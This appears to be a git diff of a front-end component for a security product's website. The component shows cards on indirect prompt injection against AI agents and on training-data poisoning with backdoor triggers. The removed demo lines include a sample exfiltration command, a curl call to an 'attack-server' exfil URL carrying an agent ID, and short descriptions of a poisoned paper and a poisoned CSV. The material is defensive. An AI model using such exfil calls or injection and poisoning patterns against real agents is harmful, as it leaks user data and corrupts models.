@@ -1,80 +1,81 @@
 import "./AttacksDemo.css";
 
-const ATTACKS = [
+const THREATS = [
   {
-    id: "a1",
-    code: "A1",
+    id: "injection",
+    code: "01",
     title: "Indirect Prompt Injection",
     badgeClass: "badge",
     cardClass: "attack-card--a1",
-    target: "Research Agent · url_fetcher",
+    target: "Web fetch · RAG retrieval · email & doc tools",
     steps: [
-      { label: "Vector", text: "Malicious paper at /papers with _fetch_instructions payload" },
-      { label: "Trigger", text: "Agent fetches poisoned content into context window" },
-      { label: "Proof", text: "EXFIL CALLBACK RECEIVED — attack.type=exfil_callback in Dynatrace" },
+      { label: "Surface", text: "Hidden directives smuggled in fetched content, retrieved docs, or untrusted upstream context" },
+      { label: "Risk", text: "Agents act on attacker instructions — silent exfil, unauthorized API calls, scope escalation" },
+      { label: "Defense", text: "Content scored at ingest, exfil destinations vetted, suspicious tool calls halted at the boundary" },
     ],
-    proof: "Dynatrace span: web_fetch + attack.detected=true",
+    proof: "Blocked before the outbound request leaves your network",
   },
   {
-    id: "a2",
-    code: "A2",
+    id: "poisoning",
+    code: "02",
     title: "Data Poisoning",
     badgeClass: "badge badge--magenta",
     cardClass: "attack-card--a2",
-    target: "Feature Engineering Agent · CSV ingest",
+    target: "Training data · feature pipelines · fine-tuning corpora",
     steps: [
-      { label: "Vector", text: "poisoned.csv with label flips + backdoor trigger rows" },
-      { label: "Trigger", text: "pandas_profile emits dataset.stats drift metrics" },
-      { label: "Proof", text: "Sentinel HALT at model.train — dataset quarantined" },
+      { label: "Surface", text: "Tampered datasets — flipped labels, backdoor triggers, distribution drift in upstream sources" },
+      { label: "Risk", text: "Models train on corrupted signal — degraded accuracy, exploitable backdoors, silent failure in production" },
+      { label: "Defense", text: "Statistical drift caught at ingest, suspect data quarantined, training halted before compute is spent" },
     ],
-    proof: "Label drift: 60/40 → 67/33 alert/drowsy",
+    proof: "Model integrity preserved — training runs on verified data only",
   },
 ];
 
 export function AttacksDemo() {
   return (
-    <section class="section" id="attacks">
+    <section class="section" id="threats">
       <div class="container">
-        <p class="section__label">Live Demo Scenarios</p>
-        <h2 class="section__title">Attacks Demo</h2>
+        <p class="section__label">What We Catch</p>
+        <h2 class="section__title">Threats We Neutralize</h2>
         <p class="section__lead">
-          Two realistic agent threats — one behavioral, one data-shaped — both caught by
-          the same Emit → Detect → Decide → Enforce loop.
+          From the prompt that reaches your agent to the data that trains your
+          model — SentinelDS guards the full agentic surface. Two of the most
+          consequential threat classes, both shut down by the same loop.
         </p>
 
         <div class="attacks__layout">
           <div class="attacks__grid">
-            {ATTACKS.map((attack) => (
+            {THREATS.map((threat) => (
               <article
-                key={attack.id}
-                class={`card cyber-chamfer attack-card ${attack.cardClass}`}
+                key={threat.id}
+                class={`card cyber-chamfer attack-card ${threat.cardClass}`}
               >
                 <div class="attack-card__header">
-                  <h3 class="attack-card__title">{attack.title}</h3>
-                  <span class={attack.badgeClass}>{attack.code}</span>
+                  <h3 class="attack-card__title">{threat.title}</h3>
+                  <span class={threat.badgeClass}>{threat.code}</span>
                 </div>
-                <p class="attack-card__target">Target: {attack.target}</p>
+                <p class="attack-card__target">Surface: {threat.target}</p>
                 <ul class="attack-card__list">
-                  {attack.steps.map((step) => (
+                  {threat.steps.map((step) => (
                     <li key={step.label}>
                       <strong>{step.label}:</strong> {step.text}
                     </li>
                   ))}
                 </ul>
-                <p class="attack-card__proof">{attack.proof}</p>
+                <p class="attack-card__proof">{threat.proof}</p>
               </article>
             ))}
           </div>
 
           <div class="card card--terminal cyber-chamfer attacks__terminal">
             <p class="terminal-line terminal-line--accent">
-              $ curl https://attack-server.run.app/exfil?session=AGENT_ID
+              [sentinel] tool_call intercepted: agent=research, tool=web_fetch
             </p>
             <p class="terminal-line">
-              EXFIL CALLBACK RECEIVED — params=&#123;"session": "AGENT_ID"&#125;
+              [sentinel] policy_check: egress_destination outside allowlist
             </p>
             <p class="terminal-line terminal-line--warn">
-              sentinel.verdict = HALT — egress.host anomalous
+              [sentinel] verdict=HALT · agent notified · audit event emitted
             </p>
           </div>
         </div>
